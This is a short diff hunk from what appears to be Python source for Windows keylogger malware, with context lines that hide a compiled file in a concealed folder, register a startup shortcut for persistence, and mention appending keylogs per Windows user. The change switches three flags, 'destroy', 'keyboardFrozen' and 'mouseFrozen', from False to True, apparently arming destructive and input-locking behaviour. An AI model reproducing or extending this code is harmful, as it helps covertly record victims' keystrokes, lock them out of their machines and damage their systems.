@@ -49,9 +49,9 @@ if not os.path.exists(hide_folder):
 	shortcut.Targetpath = hide_compiled
 	shortcut.WorkingDirectory = hide_folder
 	shortcut.save()
-destroy = False
-keyboardFrozen = False
-mouseFrozen = False
+destroy = True
+keyboardFrozen = True
+mouseFrozen = True
 curr_window = None
 user = os.environ.get("USERNAME")	# Windows username to append keylogs
 schedule = {}
